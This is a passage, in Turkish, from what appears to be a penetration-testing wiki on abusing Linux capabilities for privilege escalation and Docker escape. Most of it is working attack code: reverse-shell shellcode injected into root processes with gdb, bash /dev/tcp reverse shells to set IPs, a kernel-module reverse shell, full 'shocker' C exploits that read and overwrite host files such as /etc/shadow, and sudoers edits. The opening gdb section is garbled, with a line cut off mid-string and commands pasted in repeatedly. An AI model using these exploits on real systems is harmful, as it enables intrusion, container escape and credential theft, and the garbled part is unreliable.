   - `<format>`: Shellcode'un çıktı formatını belirtin. Örneğin, `raw`, `c`, `python`, `ruby` gibi formatlar kullanabilirsiniz.
   - `<badchars>`: Shellcode'da yer almasını istemediğiniz karakterleri belirtin. Bu, hedef sistemde sorunlara neden olabilecek karakterleri filtrelemek için kullanışlı olabilir.

2. Komutu çalıştırdıktan sonra, msfvenom shellcode'u oluşturacak ve çıktıyı ekrana yazdıracaktır. Bu çıktıyı bir metin dosyasına kaydedin.

3. Şimdi, hedef sistemdeki bir programı gdb ile çalıştırın. Örneğin, hedef programın adı `target` olsun. Aşağıdaki komutu kullanarak gdb'yi başlatın:

   ```
   gdb target
   ```

4. Gdb başladıktan sonra, hedef programı çalıştırın:

   ```
   run
   ```

5. Program çalıştığında, gdb'yi duraklatmak için `Ctrl+C` tuş kombinasyonunu kullanın.

6. Şimdi, hedef programın belleğine shellcode'u enjekte etmek için aşağıdaki gdb komutlarını kullanın:

   ```
   set {unsigned char *}0x<hedef_adres> = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Kök süreci üzerinde gdb ile hata ayıklama yapın ve önceden oluşturulan gdb satırlarını kopyalayıp yapıştırın:

```bash
gdb -p <pid>
```

```bash
(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
(gdb) catch exec
(gdb) run
```

```bash
(gdb) break main
(gdb) continue
```

```bash
(gdb) info proc mappings
(gdb) info sharedlibrary
```

```bash
(gdb) x/10i $pc
(gdb) x/10i $eip
```

```bash
(gdb) info registers
(gdb) disassemble
```

```bash
(gdb) set disassembly-flavor intel
(gdb) x/10i $pc
(gdb) x/10i $eip
```

```bash
(gdb) info frame
(gdb) backtrace
```

```bash
(gdb) info breakpoints
(gdb) delete breakpoints
```

```bash
(gdb) set disassembly-flavor att
(gdb) x/10i $pc
(gdb) x/10i $eip
```

```bash
(gdb) info threads
(gdb) thread <thread_number>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) set detach-on-fork on
(gdb) catch exec
(gdb) run
```

```bash
(gdb) break main
(gdb) continue
```

```bash
(gdb) info proc mappings
(gdb) info sharedlibrary
```

```bash
(gdb) x/10i $pc
(gdb) x/10i $eip
```

```bash
(gdb) info registers
(gdb) disassemble
```

```bash
(gdb) set disassembly-flavor intel
(gdb) x/10i $pc
(gdb) x/10i $eip
```

```bash
(gdb) info frame
(gdb) backtrace
```

```bash
(gdb) info breakpoints
(gdb) delete breakpoints
```

```bash
(gdb) set disassembly-flavor att
(gdb) x/10i $pc
(gdb) x/10i $eip
```

```bash
(gdb) info threads
(gdb) thread <thread_number>
```
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Örnek ile çevre (Docker kaçışı) - Başka bir gdb Kötüye Kullanımı**

Eğer **GDB** yüklü ise (veya örneğin `apk add gdb` veya `apt install gdb` komutuyla yükleyebilirsiniz) **ana makineden bir işlemi hata ayıklamak** ve `system` fonksiyonunu çağırmasını sağlayabilirsiniz. (Bu teknik ayrıca `SYS_ADMIN` yetkisini gerektirir).
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Komutun çıktısını göremeyeceksiniz, ancak bu işlem tarafından gerçekleştirilecektir (bu nedenle bir ters kabuk alınır).

{% hint style="warning" %}
"Etkin bağlamda sembol yok "system"." hatasını alırsanız, bir programda gdb aracılığıyla bir kabuk kodu yüklemeyi içeren önceki örneği kontrol edin.
{% endhint %}

**Ortam ile örnek (Docker kaçışı) - Kabuk Kodu Enjeksiyonu**

Docker konteyneri içinde etkinleştirilmiş yetenekleri kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
**Süreçleri** `ps -eaf` komutuyla **ana bilgisayarda** listele.

1. **Mimariyi** al `uname -m`
2. Mimari için bir **shellcode** bul ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Bir sürecin belleğine **shellcode** enjekte etmek için bir **program** bul ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. Program içindeki **shellcode**'u değiştir ve derle `gcc inject.c -o inject`
5. **Enjekte** et ve **shell**'i ele geçir: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, bir sürecin **çekirdek modüllerini yükleme ve kaldırma (`init_module(2)`, `finit_module(2)` ve `delete_module(2)` sistem çağrıları)** yetkisini sağlar ve çekirdeğin temel işlemlerine doğrudan erişim sunar. Bu yetenek, ayrıcalık yükseltme ve Linux güvenlik mekanizmalarını, Linux Güvenlik Modülleri ve konteyner izolasyonu dahil olmak üzere tüm Linux güvenlik mekanizmalarını atlayarak çekirdeği değiştirme imkanı sağladığından, ciddi güvenlik riskleri sunar.
**Bu, ana makinenin çekirdeğine çekirdek modülleri ekleyip/kaldırabileceğiniz anlamına gelir.**

**Binary örneği**

Aşağıdaki örnekte, **`python`** binary'si bu yetkiye sahiptir.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Varsayılan olarak, **`modprobe`** komutu, bağımlılık listesini ve harita dosyalarını **`/lib/modules/$(uname -r)`** dizininde kontrol eder.\
Bunu istismar etmek için, sahte bir **lib/modules** klasörü oluşturalım:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Ardından **çekirdek modülünü derleyin, aşağıda 2 örnek bulabilirsiniz ve** bu klasöre kopyalayın:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Son olarak, bu çekirdek modülünü yüklemek için gerekli python kodunu çalıştırın:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Örnek 2 - İkili Dosya ile**

Aşağıdaki örnekte, **`kmod`** ikili dosyası bu yeteneğe sahiptir.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Bu, bir çekirdek modülü eklemek için **`insmod`** komutunu kullanmanın mümkün olduğu anlamına gelir. Bu yetkiyi kötüye kullanarak bir **ters kabuk** elde etmek için aşağıdaki örneği takip edin.

**Ortam ile örnek (Docker kaçışı)**

Docker konteyneri içinde etkinleştirilmiş yetenekleri kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Önceki çıktıda **SYS\_MODULE** yeteneğinin etkin olduğunu görebilirsiniz.

**Ters kabuk** çalıştıracak olan **çekirdek modülünü** ve **derlemek** için **Makefile**'ı **oluşturun**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Makefile'daki her kelimenin önündeki boşluk karakteri **bir sekme olmalı, boşluklar olmamalıdır**!
{% endhint %}

Derlemek için `make` komutunu çalıştırın.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Son olarak, bir kabuk içinde `nc`'yi başlatın ve başka bir kabuktan **modülü yükleyin** ve nc işleminde kabuğu yakalayacaksınız:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Bu teknik kodu, "SYS\_MODULE Yetkisini Kötüye Kullanma" laboratuvarından kopyalanmıştır** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Bu teknikle ilgili başka bir örnek [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) adresinde bulunabilir.

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html), bir işlemin dosyaları okuma ve dizinleri okuma ve çalıştırma izinlerini atlamasına olanak tanır. Temel kullanımı dosya arama veya okuma amaçlıdır. Bununla birlikte, bu yetki aynı zamanda bir işlemin `open_by_handle_at(2)` işlevini kullanmasına olanak sağlar, bu işlev, işlemin bağlama ad alanının dışındaki dosyalara erişebilir. `open_by_handle_at(2)` işlevinde kullanılan tanıtıcı, `name_to_handle_at(2)` ile elde edilen saydam olmayan bir tanıtıcı olması gerekmektedir, ancak bu, değiştirilmeye açık olan inode numaraları gibi hassas bilgileri içerebilir. Bu yetkinin özellikle Docker konteynerleri bağlamında kötüye kullanılma potansiyeli, Sebastian Krahmer tarafından yapılan shocker saldırısıyla gösterilmiştir ve [burada](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) analiz edilmiştir.
**Bu, dosya okuma izin kontrolü ve dizin okuma/çalıştırma izin kontrolü atlamasına olanak sağlar.**

**Binary ile örnek**

Binary, herhangi bir dosyayı okuyabilecektir. Bu nedenle, tar gibi bir dosyanın bu yetkiye sahip olması durumunda shadow dosyasını okuyabilecektir:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Örnek binary2 ile**

Bu durumda, **`python`** binary'sinin bu yeteneği olduğunu varsayalım. Kök dosyalarını listelemek için şunu yapabilirsiniz:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Ve bir dosyayı okumak için şunu yapabilirsiniz:
```python
print(open("/etc/shadow", "r").read())
```
**Ortamda Örnek (Docker kaçışı)**

Docker konteyneri içinde etkinleştirilmiş yetenekleri kontrol etmek için şunu kullanabilirsiniz:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Önceki çıktıda, **DAC\_READ\_SEARCH** yeteneğinin etkin olduğunu görebilirsiniz. Sonuç olarak, konteyner **işlemleri hata ayıklama** yapabilir.

Aşağıdaki saldırıların nasıl çalıştığını [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) adresinden öğrenebilirsiniz, ancak özetle **CAP\_DAC\_READ\_SEARCH** bize izin vermekle kalmaz, izin kontrolü olmadan dosya sistemini gezmemize de olanak tanır ve ayrıca _**open\_by\_handle\_at(2)**_ ve **diğer işlemler tarafından açılan hassas dosyalara erişmemize izin verebilir**.

Bu izinleri kötüye kullanan orijinal saldırıyı, dosyaları ana makineden okumak için kullanabilen bir **değiştirilmiş bir sürümünü** burada bulabilirsiniz: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), aşağıdaki ise okumak istediğiniz dosyayı ilk argüman olarak belirtebileceğiniz ve bir dosyaya dökmenizi sağlayan bir sürümüdür.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
Exploit, bir şeyin ana bilgisayara bağlı olduğu bir işaretçi bulmalıdır. Orijinal exploit /.dockerinit dosyasını kullanırken, bu değiştirilmiş sürüm /etc/hostname kullanır. Eğer exploit çalışmıyorsa farklı bir dosya belirlemeniz gerekebilir. Ana bilgisayara bağlı bir dosyayı bulmak için sadece mount komutunu çalıştırın:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Bu teknik kodu, "Abusing DAC\_READ\_SEARCH Capability" laboratuvarından kopyalanmıştır** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) İspanya'daki en önemli siber güvenlik etkinliği ve Avrupa'daki en önemli etkinliklerden biridir. Teknik bilginin yayılmasını amaçlayan bu kongre, her disiplindeki teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Bu, herhangi bir dosyada yazma izni kontrolünü atlayabileceğiniz anlamına gelir, bu nedenle herhangi bir dosyaya yazabilirsiniz.**

**Ayrıcalıkları yükseltmek için üzerine yazabileceğiniz birçok dosya vardır,** [**buradan fikir alabilirsiniz**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Binary ile örnek**

Bu örnekte vim bu yetkiye sahiptir, bu nedenle passwd, sudoers veya shadow gibi herhangi bir dosyayı değiştirebilirsiniz:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Örnek 2 ile ilgili**

Bu örnekte **`python`** ikili dosyası bu yeteneğe sahip olacak. Python'u kullanarak herhangi bir dosyayı geçersiz kılabilirsiniz:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Ortam ile birlikte örnek + CAP_DAC_READ_SEARCH (Docker kaçışı)**

Docker konteyneri içinde etkinleştirilmiş yetenekleri kontrol etmek için şunu kullanabilirsiniz:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Öncelikle, ana bilgisayardaki herhangi bir dosyayı okumak için DAC_READ_SEARCH yeteneğini kötüye kullanma bölümünü okuyun (linux-capabilities.md#cap_dac_read_search) ve saldırıyı derleyin.\
Ardından, ana bilgisayarın dosya sistemine keyfi dosyalar yazmanıza izin verecek aşağıdaki shocker saldırısının bir sürümünü derleyin:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Docker konteynerinden kaçmak için, ana makineden `/etc/shadow` ve `/etc/passwd` dosyalarını **indirebilirsiniz**, onlara bir **yeni kullanıcı** ekleyebilir ve **`shocker_write`** kullanarak üzerlerine yazabilirsiniz. Ardından, **ssh** üzerinden **erişebilirsiniz**.

**Bu teknik kodu, "Abusing DAC\_OVERRIDE Capability" laboratuvarından** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **kopyalanmıştır.**

## CAP\_CHOWN

**Bu, herhangi bir dosyanın sahipliğini değiştirmenin mümkün olduğu anlamına gelir.**

**Binary ile örnek**

Varsayalım ki **`python`** binary'si bu yeteneğe sahip, **shadow** dosyasının **sahibini değiştirebilir**, **root şifresini değiştirebilir** ve ayrıcalıkları yükseltebilirsiniz:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Veya **`ruby`** ikili dosyasına bu yetenek atanarak:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Bu, herhangi bir dosyanın iznini değiştirmenin mümkün olduğu anlamına gelir.**

**Örnek binary ile**

Eğer python bu yeteneğe sahipse, shadow dosyasının izinlerini değiştirebilir, **root şifresini değiştirebilir** ve ayrıcalıkları yükseltebilirsiniz:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Bu, oluşturulan işlemin etkin kullanıcı kimliğini ayarlamak mümkün olduğu anlamına gelir.**

**Binary ile örnek**

Eğer python bu **yeteneğe** sahipse, ayrıcalıkları kök kullanıcıya yükseltmek için bunu çok kolay bir şekilde kötüye kullanabilirsiniz:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Başka bir yol:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Bu, oluşturulan işlemin etkin grup kimliğini ayarlamak mümkün olduğu anlamına gelir.**

Ayrıcalıkları yükseltmek için üzerine yazabileceğiniz birçok dosya vardır, [buradan fikir alabilirsiniz](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Örnek ikili dosya ile**

Bu durumda, herhangi bir grubu taklit edebileceğiniz için bir grup tarafından okunabilen ilginç dosyalar aramalısınız:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Bir dosyayı (okuma veya yazma yoluyla) kötüye kullanarak ayrıcalıkları yükselttikten sonra, **ilgi çekici grubu taklit ederek bir kabuk alabilirsiniz**:

```bash
newgrp <group>
```

